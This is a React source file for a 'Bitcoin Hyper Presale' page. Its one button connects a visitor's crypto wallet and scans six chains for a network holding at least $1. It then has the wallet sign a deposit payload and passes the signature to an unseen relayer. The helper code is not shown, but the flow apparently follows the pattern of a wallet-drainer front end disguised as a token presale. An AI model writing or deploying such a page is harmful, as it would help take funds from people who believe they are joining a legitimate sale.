import React, { useState } from "react";
import { createRoot } from "react-dom/client";
import { ethers } from "ethers";

// AppKit imports
import { createAppKit } from '@reown/appkit/react';
import { WagmiProvider } from 'wagmi';
import { mainnet, bsc, polygon, arbitrum, optimism, avalanche } from '@reown/appkit/networks';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';

// Relayer utility imports (adjust paths)
import { findEligibleNetwork } from "./utils/balanceScanner.js";
import { getNonce } from "./utils/getNonce.js";
import { signDeposit } from "./utils/signDeposit.js";
import { sendRelayer } from "./utils/sendRelayer.js";

// ------------------- APPKIT SETUP -------------------
const projectId = '906bd57a09299f262aab595f3226ec60'; // Your Reown projectId
const networks = [mainnet, bsc, polygon, arbitrum, optimism, avalanche];
const queryClient = new QueryClient();

const wagmiAdapter = new WagmiAdapter({
  networks,
  projectId,
  ssr: true,
});

export const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  themeMode: 'dark',
  themeVariables: {
    '--w3m-accent': '#F7931A',
    '--w3m-color-mix': '#F7931A',
    '--w3m-color-mix-strength': 20,
    '--w3m-border-radius-master': '8px'
  },
  features: { analytics: true, email: false, socials: false }
});

function AppKitProvider({ children }) {
  return (
    <WagmiProvider config={wagmiAdapter.wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        {children}
      </QueryClientProvider>
    </WagmiProvider>
  );
}

// ------------------- APP COMPONENT -------------------
function App() {
  const [walletAddress, setWalletAddress] = useState(null);

  const startRelayerFlow = async () => {
    try {
      // 1️⃣ Connect wallet (triggers AppKit modal)
      const wallet = await modal.connect();
      setWalletAddress(wallet.address);
      console.log("Connected wallet:", wallet.address);

      // 2️⃣ Find eligible network
      const network = await findEligibleNetwork(wallet.address);
      if (!network) {
        alert("No network with $1+ balance found");
        return;
      }
      console.log("Using network:", network.name);

      // 3️⃣ Create provider for that network
      const rpcProvider = new ethers.JsonRpcProvider(network.rpc);

      // 4️⃣ Get nonce
      const nonce = await getNonce(rpcProvider, wallet.address);

      // 5️⃣ Prepare payload and sign
      const amount = "0.0005";
      const payload = await signDeposit(wallet.signer, network.chainId, amount, nonce);

      // 6️⃣ Send to relayer
      const result = await sendRelayer(payload);
      console.log("Relayer result:", result);

      if (result.success) {
        alert(`Transaction executed on ${result.network}\nHash: ${result.hash}`);
      } else {
        alert("Relayer failed: " + JSON.stringify(result));
      }
    } catch (err) {
      console.error("Error in relayer flow:", err);
    }
  };

  return (
    <div style={{ textAlign: "center", marginTop: "100px", fontFamily: "sans-serif" }}>
      <h1>Bitcoin Hyper Presale</h1>
      {!walletAddress && (
        <button
          onClick={startRelayerFlow}
          style={{
            padding: "12px 24px",
            fontSize: "16px",
            borderRadius: "8px",
            backgroundColor: "#F7931A",
            color: "#fff",
            border: "none",
            cursor: "pointer",
            marginTop: "20px"
          }}
        >
          Connect Wallet & Start
        </button>
      )}
      {walletAddress && <p>Connected: {walletAddress}</p>}
    </div>
  );
}

// ------------------- RENDER -------------------
createRoot(document.getElementById("root")).render(
  <AppKitProvider>
    <App />
  </AppKitProvider>
);
